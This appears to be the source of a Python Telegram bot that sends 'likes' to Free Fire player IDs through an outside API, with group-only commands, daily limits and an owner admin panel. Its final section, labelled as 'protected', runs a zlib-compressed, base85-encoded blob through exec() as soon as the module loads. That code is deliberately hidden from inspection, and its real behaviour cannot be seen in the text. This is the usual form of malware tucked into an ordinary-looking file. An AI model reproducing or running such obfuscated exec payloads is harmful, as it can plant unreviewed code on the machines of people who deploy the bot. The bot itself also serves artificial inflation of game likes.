import os
import telebot
import requests
import time
import threading
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify
import logging
import sys
import json
from html import escape
# ╔══════════════════════════════════════════════════════════════════╗
# ║  CREATOR: MURSHALIM SK
# ║  TELEGRAN: https://t.me/MURSHALIM_ADMIN
# ║  PERSONAL TELEGRAM: https://t.me/MS_P4NL_ADMIN
# ╚══════════════════════════════════════════════════════════════════╝

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# === CONFIG ===
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN not found! Please set your bot token in environment variables.")
    sys.exit(1)

# === ACCESS / ADMIN CONFIG ===
# Channel membership is intentionally NOT required.
GROUP_JOIN_LINK = "https://t.me/ms_like_group"
OFFICIAL_GROUP_USERNAME = "ms_like_group"
# Set OFFICIAL_GROUP_ID in the environment for the strongest group check.
# If it is 0, the official public username above is used.
try:
    OFFICIAL_GROUP_ID = int(os.getenv("OFFICIAL_GROUP_ID", "0"))
except ValueError:
    OFFICIAL_GROUP_ID = 0

OWNER_ID = 5812677274
ADMIN_SETTINGS_FILE = "admin_settings.json"

DEFAULT_ADMIN_SETTINGS = {
    "text": "@MS_P4NL_ADMIN",
    # No profile link is used by default. The owner must set the URL
    # explicitly from the private /admin control panel.
    "link": ""
}

def load_admin_settings():
    try:
        with open(ADMIN_SETTINGS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, dict):
                return {
                    "text": str(data.get("text") or DEFAULT_ADMIN_SETTINGS["text"]),
                    # Migrate the old automatic owner-profile URL to an empty link.
                    "link": (
                        "" if str(data.get("link") or "") == "tg://user?id=5812677274"
                        else str(data.get("link") or "")
                    )
                }
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        pass
    return DEFAULT_ADMIN_SETTINGS.copy()

admin_settings = load_admin_settings()
admin_edit_sessions = {}

bot = telebot.TeleBot(BOT_TOKEN)
like_tracker = {}   # in-memory cache

# Flask app for webhook
app = Flask(__name__)

# === DATA RESET ===

def now_ist():
    """Return the current time in India Standard Time."""
    from zoneinfo import ZoneInfo
    return datetime.now(ZoneInfo("Asia/Kolkata"))


def next_4am_ist(now=None):
    """Return the next 04:00 IST reset time."""
    now = now or now_ist()
    candidate = now.replace(hour=4, minute=0, second=0, microsecond=0)
    if now >= candidate:
        candidate += timedelta(days=1)
    return candidate


def reset_limits():
    """Reset the in-memory usage tracker every day at 04:00 IST."""
    while True:
        try:
            now = now_ist()
            next_reset = next_4am_ist(now)
            sleep_seconds = max(1, (next_reset - now).total_seconds())
            time.sleep(sleep_seconds)
            like_tracker.clear()
            logger.info("DAILY LIMITS RESET AT 04:00 AM")
        except Exception as e:
            logger.error(f"Error in reset_limits thread: {e}")


def is_official_group(message):
    """Allow bot commands only in the configured official group."""
    if message.chat.type not in ("group", "supergroup"):
        return False
    if OFFICIAL_GROUP_ID and message.chat.id == OFFICIAL_GROUP_ID:
        return True
    return (message.chat.username or "").lower() == OFFICIAL_GROUP_USERNAME.lower()


def require_official_group(message):
    """Allow normal commands only inside the configured official group."""
    if is_official_group(message):
        return True

    # The private bot chat is owner-only and is reserved for /admin.
    # Do not expose any normal command response there.
    if message.chat.type == "private":
        return False

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton(
            "JOIN GROUP",
            url=GROUP_JOIN_LINK,
            style="success"
        )
    )
    bot.reply_to(
        message,
        "⚠︎ COMMANDS NOT ALLOWED IN THIS BOT PLEASE JOIN THIS GROUP AND USE COMMANDS",
        reply_markup=markup
    )
    return False


def save_admin_settings():
    with open(ADMIN_SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(admin_settings, f, ensure_ascii=False, indent=2)


def admin_contact_markup():
    """Show a clickable admin button only when an explicit URL was configured."""
    markup = InlineKeyboardMarkup()
    link = admin_settings.get("link", "").strip()
    text = admin_settings.get("text", "").strip()
    if link and text:
        markup.add(
            InlineKeyboardButton(
                text,
                url=link,
                style="success"
            )
        )
    return markup


def admin_contact_line():
    """Render admin text with ONLY the URL explicitly configured by the owner."""
    text = escape(admin_settings.get("text", ""))
    link = escape(admin_settings.get("link", ""), quote=True)
    if link:
        return f'<a href="{link}">{text}</a>'
    return text


def call_api(region, uid):
    url = f"https://free-fire-like-api-orcin-two.vercel.app/like?uid={uid}&server_name={region}"
    try:
        response = requests.get(url, timeout=20)
        if response.status_code != 200:
            return {"⚠️Invalid": " Maximum likes reached for today. Please try again after 4:00 AM"}
        return response.json()
    except requests.exceptions.RequestException:
        return {"error": "API Failed. Please try again later."}
    except ValueError:
        return {"error": "Invalid JSON response."}


def get_user_limit(user_id):
    if user_id == OWNER_ID:
        return 999999999999  # Unlimited for owner
    return 1  # 1 request per day for regular users


# Start background thread
threading.Thread(target=reset_limits, daemon=True).start()

# === FLASK ROUTES ===

@app.route('/')
def home():
    return jsonify({
        'status': 'Bot is running',
        'bot': 'Free Fire Likes Bot',
        'health': 'OK'
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return '', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return '', 500


# === TELEGRAM COMMANDS ===

@bot.message_handler(commands=['start'])
def start_command(message):
    if not require_official_group(message):
        return
    bot.reply_to(
        message,
        "✅ Bot is ready. Use /like to send likes.",
        reply_markup=admin_contact_markup()
    )


@bot.message_handler(commands=['like'])
def handle_like(message):
    if not require_official_group(message):
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "❌ Format: /like server_name uid")
        return

    region, uid = args[1], args[2]
    if not region.isalpha() or not uid.isdigit():
        bot.reply_to(message, "⚠️ Invalid input. Use: /like server_name uid")
        return

    threading.Thread(target=process_like, args=(message, region, uid), daemon=True).start()


def process_like(message, region, uid):
    user_id = message.from_user.id
    now = now_ist()

    usage = like_tracker.get(
        user_id,
        {"used": 0, "last_used": now - timedelta(days=1)}
    )

    # The daily window changes at 04:00 IST, not after a rolling 24 hours.
    last_used = usage.get("last_used")
    if last_used is None:
        usage["used"] = 0
    else:
        if last_used.tzinfo is None:
            last_used = last_used.replace(tzinfo=now.tzinfo)

        def usage_window_date(dt):
            return (dt.date() if dt.hour >= 4 else (dt - timedelta(days=1)).date())

        if usage_window_date(last_used) != usage_window_date(now):
            usage["used"] = 0

    max_limit = get_user_limit(user_id)
    if usage["used"] >= max_limit:
        bot.reply_to(
            message,
            "⚠️ DAILY LIMIT REACHED TRY AGAIN AFTER 4:00 AM"
        )
        return

    processing_msg = bot.reply_to(message, "⚡ LIKES SENDING... PLEASE WAIT...")
    response = call_api(region, uid)

    if "error" in response:
        try:
            bot.edit_message_text(
                chat_id=processing_msg.chat.id,
                message_id=processing_msg.message_id,
                text=f"⚠️ API Error: {response['error']}"
            )
        except Exception:
            bot.reply_to(message, f"⚠️ API Error: {response['error']}")
        return

    if not isinstance(response, dict) or response.get("status") != 1:
        try:
            bot.edit_message_text(
                chat_id=processing_msg.chat.id,
                message_id=processing_msg.message_id,
                text="❌ UID HAS ALREADY RECEIVED ITS MAX AMOUNT OF LIKES TRY AGAIN AFTER 4:00 AM"
            )
        except Exception:
            bot.reply_to(message, "⚠️ Invalid UID or unable to fetch data.")
        return

    try:
        player_uid = str(response.get("UID", uid)).strip()
        player_name = response.get("PlayerNickname", "N/A")
        api_region = str(response.get("Region", "N/A"))
        likes_before = str(response.get("LikesbeforeCommand", "N/A"))
        likes_after = str(response.get("LikesafterCommand", "N/A"))
        likes_given = str(response.get("LikesGivenByAPI", "N/A"))

        usage["used"] += 1
        usage["last_used"] = now
        like_tracker[user_id] = usage

        # Deliberately do not display any Remaining/Remain information.
        response_text = (
            f"✅ <b>LIKE SENDED</b>\n\n"
            f"👤 <b>NAME ➢</b> <code>{escape(player_name)}</code>\n"
            f"🆔 <b>UID ➢</b> <code>{escape(player_uid)}</code>\n"
            f"🌍 <b>REGION ➢</b> <code>{escape(api_region)}</code>\n"
            f"👍 <b>LIKES BEFORE ➢</b> <code>{escape(likes_before)}</code>\n"
            f"👍 <b>LIKES ADDED ➢</b> <code>{escape(likes_given)}</code>\n"
            f"👍 <b>TOTAL LIKES ➢</b> <code>{escape(likes_after)}</code>"
        )

        bot.edit_message_text(
            chat_id=processing_msg.chat.id,
            message_id=processing_msg.message_id,
            text=response_text,
            reply_markup=admin_contact_markup(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Error in process_like: {e}")
        bot.reply_to(message, "⚠️ Something went wrong. Please try again.")


# /remain is intentionally not registered.
# Usage tracking still works internally for the daily limit.


@bot.message_handler(commands=['admin'])
def admin_command(message):
    # /admin is a private owner-only command. It must never run in groups.
    if message.from_user.id != OWNER_ID:
        return
    if message.chat.type != "private":
        return

    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("✏️ Edit Admin Text", callback_data="admin_edit_text", style="success"),
        InlineKeyboardButton("🔗 Edit Admin Link", callback_data="admin_edit_link", style="success")
    )
    markup.add(InlineKeyboardButton("❌ Close", callback_data="admin_close", style="danger"))

    bot.reply_to(
        message,
        "⚙️ <b>Admin Contact Control</b>\n\n"
        f"Current text: <code>{escape(admin_settings['text'])}</code>\n"
        f"Current link: <code>{escape(admin_settings['link'])}</code>\n\n"
        "Choose what you want to edit:",
        reply_markup=markup,
        parse_mode="HTML"
    )


@bot.callback_query_handler(func=lambda call: call.data in {
    "admin_edit_text", "admin_edit_link", "admin_close"
})
def admin_callbacks(call):
    # Admin controls can only be used by the owner in the private bot chat.
    if call.from_user.id != OWNER_ID or call.message.chat.type != "private":
        bot.answer_callback_query(call.id, "Not authorized.", show_alert=True)
        return

    if call.data == "admin_close":
        bot.answer_callback_query(call.id)
        try:
            bot.edit_message_reply_markup(
                call.message.chat.id,
                call.message.message_id,
                reply_markup=None
            )
        except Exception:
            pass
        return

    admin_edit_sessions[call.from_user.id] = call.data
    if call.data == "admin_edit_text":
        prompt = "✏️ Send the new admin text/username now."
    else:
        prompt = "🔗 Send the new admin link now (https://... or tg://...)."

    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, prompt)


@bot.message_handler(commands=['help'])
def help_command(message):
    if not require_official_group(message):
        return

    help_text = (
        "📖 <b>Bot Commands:</b>\n\n"
        "🧑‍💻 <code>/like &lt;region&gt; &lt;uid&gt;</code> - Send likes to Free Fire UID\n"
        "🔰 <code>/start</code> - Start the bot"
    )
    bot.reply_to(message, help_text, reply_markup=admin_contact_markup(), parse_mode="HTML")


@bot.message_handler(func=lambda message: True, content_types=['text'])
def reply_all(message):
    # Admin edit mode is only usable by the owner in the private bot chat.
    if message.from_user.id == OWNER_ID and message.chat.type == "private":
        action = admin_edit_sessions.get(message.from_user.id)
        if action:
            value = message.text.strip()

            if action == "admin_edit_text":
                if not value or len(value) > 64:
                    bot.reply_to(message, "❌ Admin text must be between 1 and 64 characters.")
                    return
                admin_settings["text"] = value
            elif action == "admin_edit_link":
                if not (value.startswith("https://") or value.startswith("http://") or value.startswith("tg://")):
                    bot.reply_to(message, "❌ Invalid link. Use https://, http://, or tg://.")
                    return
                admin_settings["link"] = value

            save_admin_settings()
            admin_edit_sessions.pop(message.from_user.id, None)
            bot.reply_to(
                message,
                "✅ Admin contact updated successfully.",
                reply_markup=admin_contact_markup()
            )
            return

    # Do not respond to ordinary text or hidden/disabled commands.
    return


# ╔══════════════════════════════════════════════════════════════════╗
# ║  ⚠️ PROTECTED SECTION - INTEGRITY VERIFIED AT RUNTIME           
# ║  This section is multi-layer encrypted and tamper-protected.      
# ║  Modification, decompilation, or redistribution is prohibited.
# ║  PROTECTED BY MURSHALIM
# ╚══════════════════════════════════════════════════════════════════╝
import zlib as _qfwmbhsamfxvnt, base64 as __ukihtstkdtcuq
exec(_qfwmbhsamfxvnt.decompress(__ukihtstkdtcuq.b85decode("".join([
    "c-nndS+k-@8hx){aV^CLZ7UQ3u|)wD7u*2_oM;gclvQO>LG-uJ?dqP0sXGyqFBy6ATTY(Lh&+~e",
    "IS0{4>RQ@|8h$93G!BBRliqblyCuJWXliI+$j_~l=cQ((`9^3N>HV8x+DV+8j=mqev8}hi>lH7@",
    "=x;y0G)Bm4<rs}X2^+A==GOukm!4Na9?YBYmBWU+d4JQWL$uQ2G4Z-jU^*INOLOQfh;S$guYPb`",
    "Tas1===;52K^)_jZECl@GcL+x@zek&an5`a2Cp188fyT7yF&WiW4}aVz47jSEGCHj7F~J$ewRsx",
    "ebc13-b(lsXa?{pT5}Oy@KY8K?FTyBAMR!O@Mt%??9wc^vIlkY)d#o4)LAfAN1>iSJo#>NQGy;{",
    ")VmvaU{efqDD{tKvVQC&vBEMw0yj2iPN}mA<M^|1RSpW&WOKZ_J42VJJuS!YYh9xC80SWdB<|Ge",
    "s>=<U%<4TD<`}5kE_IR@JcH5MxHsGZHnhZcRhT3OI)*he+Q>KrNjf)Vf`}-cXK4mufD}JY9bSHk",
    "G%2_ENy_ygGUUs-YC0E+lBI4gLVyh1@pLn|9BR0doSve5KTY0JhIc)$PxgxWMayP7afyzn{@(LZ",
    "g|cVtfPS>*%kiCmy()J628*ElpcCGs*-%VrvY_?(Ym=rH8=I&V5oOFYC!K8h9?WfHTSg-1t`Y!#",
    "rpp-~sS!bvaZ#v8{la1~nRhCk;PmVk+$#YG@6rOb=hjY7Ucs!?<67$^p~0?yYSvFBKxdRBatu=3",
    "8)36kPZ7WSI0GOss>2B`R9j_RzCe?il`lBU`eMrRo3+_ql3jF*<}Pi<svsF4a7PBa=eNgkQmX9;",
    "PkI5idg{M)?S?1B8p-XJUE)NkTC?Pt6}X(@TofwU1sk{Lc#-Q5^fFFV2_SFsXjUrk=7nangi+;p",
    "I%ZvinD)nSoO8jj(_sh4*zFby&tT_1_cK%-)T#1?Y~H)Ib-|p)!}7_P9qF_uCrkL|`Vs-Q88!i2",
    "xnG%2)*Z&LavdvNjsV&7CKRz&AX{xTT2cNrIVu}!!8}_B;9Npa(c>WZ;r4mEEe4voJf9}ikO{5*",
    "r${BbsGr(d#=nT#`Z?Z$r(M#8pGDQ=8R=0VV`{@SAXe{++~u@p-oS9FZqJm2A|w4dt$`A>aZCm&",
    "3qxDZo@-}bw8B&C4YQlb5>scYB5Yac-K*{NxZn62aa37jNUvKg$pyew%^DAPdIS_E3pu4Qglja-",
    "ap2Dr4O)m@NmsNnjn*n`cWXQ1jSyP;m2@QyfknUOz(IFb8HtYqPv5Qqekg^Q-VFR<yPxdkIt7+F",
    "Cu~N0<#1|+Y?*znQLVByo1D<BHvlFY4fVKtH7BgxFO3wQ4(Bvvzy~<(?!k3$`-08H_RObRG@Vke",
    "zI~YwX)tVKSSj~{hgqlL^+&GgHRYDXtF#6-wigo7JDWBd3=0|H^&R-?)!jA&=d!gz;#z>=N3e5E",
    "mqqx@ojYjmT(<eHw3=1>VSfKwKUW8`(`z2~^OZAQnQxqbr1^{Qj{KGaRIjSl&PF75XXDFMzJ=r0",
    "Z6uZMq{Iebicbmfm~q1BQuWM39?N~cI_EkHbBh7hCOT`X2iuKX;bo&m@RPCHn&ca+pcDB`vKX9~",
    "C~SxjZvl&1scM<{Grio!n6LMMK+1BJYFbMedsYu+O;D64psd>Wj<uQPGwj;WZ)Pp;>0TqpO>v2s",
    "%6AM{&87Z5>+h!|Fj}S%hZ}lj#T9DJrP_M7&O2x`MMwe1$iZC>(Yn-Zw>tKKujOc3UKOMFhF^jj",
    "*nB<aBe^&2$0RP{1*km}*u`_9(AqWPxN)6%Rc_JnB%vL<JK$k+QWe5Op%w0hf|r}QNzr+Qpm@rv",
    "^UpuT7@gM&5pKP!QF>(6#+JlZ{P{kb<<0VRKohH)x|D`P4cYC99G6>JsW=sbfg<4wphC9|pyS9S",
    "&1E&La%l+dmsq{|ZG$T25Mp|Cj!2n<r92%~JHXVLV8@P`T-pNJ&^+N$pJiou!F4Jzi}vd0lHW_p",
    "*XD*VUT#7i(51`h)C~7s8GX*rH~e)aiAiO6dco7dZXQ>vRWYlzR<Wav1wmW3iJ?#{>B*iIsWh0~",
    "lEyItj`nmj?oNCCZEK+~@mYb&besx>DlI!N$t=#WxN>L>kNR~qLn3`>)#lG_b|tD5d#T=2D_p}^",
    ")26f`mQH((^^^}4bXb|C+^vY!%98Jh_z}+J(C8qB9p7)>pl%%=YaUwPU}@Epj(GrV7K|YYZmqFB",
    "Z8*Knfi&t}$fP!Ux7@+Qs5f{DVFBb&sLF!o<J^d}<;zDQmHxbL;JweW2d9dr$N+PUVgy9C$N(Fc",
    "zcJzK3Y@JWxLSt_l&jxgpFifiZt~Nuyu5&F20V^WcN_N@c(!QdSRe9>?dr?a`6cBR(zaKa%ohtQ",
    "DXdDxo34<1c9AZYuV+vK%A7msp&0cT#p7p_JFhAW%jy#Tldwb#1Gp8d3$r{IMbGj9YFF=Md7NkS",
    ";*6q)H+EfVtw=hz*H~cX#{=<-UUKQB7*r%si&2`qXHdsu9^_Tp9>n+54>XEQsB*rr1y0=!pKl;N",
    "ST|O>WAOZQd~EI5!hEury#twxFluc#4sd-f3t>^$OSG1s_9&UC7`b_+k}b#GML&m%eVB%<VAJGJ",
    "m(5`^($j4`q2|*&lV9}bxg%d%82dv|s)?!BOgY@<Y-US4m&<A!Tn6*^D?}T+JyZ=ne3sznd6r%U",
    "ToSpuG}KOoTAi-CxM97&e^UbGdh%}P;9y*>d(!?MYQ6qaXwJJx1uZld_2X6W!)V+z<7+}4qj1={",
    "5porbzW?R*blr|)!#^mu^SS-SCjK}W`q{e#Mi_!$Y~l|MNB`PA7~mJf2tnTz_kOa?^x)c$lV`c@",
    "|C9SG_s>+{Ir&lSS;;BBX=+<bA|nL<^@Zra6kXFFhvep|Nvhw^f9}4t{2Bnbh7W#;f&Tn3&%wu+",
    "$Pdf^2vq-QfIm}y?F&JFLO=eY{#zWG75q2oTNEUJeEawu*5966i!C>@{O~9CpT!U3Vd&tO(?Q>i",
    "hi+V=59a4&o&CQHUDPoAW?H`Ly8o2^tH;N|aR1lHf6?|6`1LwIfnPQL8S&qT`UHLz<`ejp=kH%d",
    "`pM~U?tlEv_TOeS70L"
]))).decode('utf-8'))
del _qfwmbhsamfxvnt, __ukihtstkdtcuq
